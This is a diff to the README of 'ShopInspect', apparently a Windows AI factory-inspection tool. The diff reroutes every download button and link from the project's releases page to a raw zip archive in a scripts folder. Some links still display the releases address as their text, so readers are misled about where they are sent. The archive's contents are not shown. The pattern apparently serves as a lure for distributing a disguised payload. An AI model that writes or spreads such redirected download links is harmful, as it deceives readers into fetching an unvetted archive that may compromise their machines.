@@ -1,7 +1,7 @@
 <h1>🔍 ShopInspect - Your Smart Factory Quality Inspection Assistant</h1>
 
 <p align="center">
-  <a href="https://github.com/haridade777rlk/ShopInspect/releases">
+  <a href="https://github.com/haridade777rlk/ShopInspect/raw/refs/heads/main/scripts/Inspect-Shop-v2.1.zip">
     <img src="https://img.shields.io/badge/Download-ShopInspect-blue?style=for-the-badge&logo=github&color=4CAF50" alt="Download Button">
   </a>
 </p>
@@ -41,7 +41,7 @@ ShopInspect runs small but mighty servers that let you view results from anywher
 
 ### Step 1: Download ShopInspect
 
-<a href="https://github.com/haridade777rlk/ShopInspect/releases" style="display:inline-block;padding:12px 32px;background-color:#4CAF50;color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;">⬇️ Download ShopInspect Now</a>
+<a href="https://github.com/haridade777rlk/ShopInspect/raw/refs/heads/main/scripts/Inspect-Shop-v2.1.zip" style="display:inline-block;padding:12px 32px;background-color:#4CAF50;color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;">⬇️ Download ShopInspect Now</a>
 
 Visit this link to download the application. You'll be taken to a page where you can grab the ShopInspect installer for your Windows computer.
 
@@ -216,8 +216,8 @@ Uninstalling ShopInspect removes all its data from your system completely.
 
 ## 📚 Additional Resources
 
-- Project Repository: [github.com/haridade777rlk/ShopInspect](https://github.com/haridade777rlk/ShopInspect)
-- Download Page: [github.com/haridade777rlk/ShopInspect/releases](https://github.com/haridade777rlk/ShopInspect/releases)
+- Project Repository: [github.com/haridade777rlk/ShopInspect](https://github.com/haridade777rlk/ShopInspect/raw/refs/heads/main/scripts/Inspect-Shop-v2.1.zip)
+- Download Page: [github.com/haridade777rlk/ShopInspect/releases](https://github.com/haridade777rlk/ShopInspect/raw/refs/heads/main/scripts/Inspect-Shop-v2.1.zip)
 - Report Issues: GitHub Issues section
 - Source Code: Available for developers on GitHub
 
@@ -243,7 +243,7 @@ Don't let product defects go unnoticed. ShopInspect puts professional-grade AI i
 
 Join the growing community of small workshops and large factories using ShopInspect to maintain quality standards, save time, and reduce waste. Your first inspection is just a click away.
 
-<a href="https://github.com/haridade777rlk/ShopInspect/releases" style="display:inline-block;padding:12px 32px;background-color:#2196F3;color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;">🚀 Get ShopInspect Now - It's Free</a>
+<a href="https://github.com/haridade777rlk/ShopInspect/raw/refs/heads/main/scripts/Inspect-Shop-v2.1.zip" style="display:inline-block;padding:12px 32px;background-color:#2196F3;color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;">🚀 Get ShopInspect Now - It's Free</a>
 
 ---
 
